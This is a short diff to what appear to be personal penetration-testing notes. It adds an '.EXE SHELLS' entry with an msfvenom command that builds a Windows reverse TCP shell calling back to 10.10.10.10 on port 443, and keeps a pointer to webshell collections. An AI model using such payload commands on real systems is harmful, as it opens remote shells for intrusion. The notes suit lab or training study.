@@ -1,9 +1,17 @@
+.EXE SHELLS
+
+msfvenom -p /windows/x64/reverse_shell_tcp LHOST=10.10.10.10 LPORT=443
+
+
+
+
+
+
 WEBSHELLS
 
 Different kinds of webshells can be found in kali directory.
 
 Also here pentestmonkey.net
-
 
 
 
